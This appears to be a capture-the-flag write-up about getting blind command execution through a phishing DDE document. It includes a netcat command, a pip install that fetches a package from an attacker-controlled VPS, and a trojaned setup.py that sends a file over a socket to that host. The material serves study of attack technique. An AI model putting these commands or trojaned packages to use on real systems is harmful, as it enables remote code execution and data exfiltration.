Early on in the challenge, the EWA and EMI systems had some reliabilty issues.
Using the DDE exploit it took a while to get any command execution to work.
Any attempt to run a more complicated command would fail.

We weren't sure if our commands were failing due to quoting or escaping issues or
even how to tell.  Eventually it was determined that even a previously known
working =dir | nc host port= command was failing almost every time.  Any
experiment we could come up with was tainted by the lack of reliability on the
backend.  Not only was it a blind command injection exploit, but if an attempt
failed we had no way of knowing why.  We had to run something we KNEW would
work, and that would confirm it had been executed.

We were able to use =dir= and =nc= to determine that Python was installed, and then
were able to run =python -V=.  Once we knew we could run Python and pass it
arguments, we ran {{{abbr(the standard python package installation tool, pip)}}}:

#+BEGIN_SRC
python -m pip install https://my.vps.domain/test.tar.gz
#+END_SRC

A minute later, we got a hit for =test.tar.gz=!  The benefit of this method is
that the command itself does not require any special characters that may need
escaping.  There are no quotes or pipes or backslashes to worry about.  The fact
that =pip= will initially request the file from our server also meant we knew the
phishing DDE exploit worked.  We could use this method as a solid base to run
further experiments.  Once the =pip= command was worked out, the docx file did
not need to be changed between runs.

With =pip= working, it was a simple matter of putting together a trojaned
=setup.py= in the style of [[https://twitter.com/JustinAzoff/status/881163562739277824][previous shenanigans seen in the wild]]

The first trojaned package was written by hand:

#+BEGIN_SRC python
# setup.py
from distutils.core import setup
setup(name='upload_doc',
      version='1.2',
)
#hax

try:
    import base64
    import socket
    with open("C:/GreatBookPage7.pdf", "rb") as f:
        document = f.read()
    encoded = base64.encodestring(document)

    s=socket.socket()
    s.connect(('my.vps.domain',44665))
    s.send(encoded)
    s.close()
except Exception as e:
    print("oops")
    print(e)
#+END_SRC

We then ran

#+BEGIN_SRC
python setup.py sdist
#+END_SRC

to build the upload_doc-1.2.tar.gz tarball.  By copying this file to the VPS,
and having pip install it, it would run our Python code.  Unfortunately EWA/EMI
was having a lot of issues at this time, and it took almost 2 days before we were
able to see this work.  Fortunately, because we were now using a known good docx
file, we knew the problem was not on our end.

The trojanpkg.py module automates this by building a tarball in memory based on
an arbitrary injected code block.  This enables the destination address to be
templated in on the fly, instead of hardcoded in the package.  This enabled
other members of the team to run the exploit code without having to edit the
source to match their environment.

The trojanpkgweb.py module builds on top of trojanpkg.py to start up a web
server that dynamically serves up a trojaned package for any url.
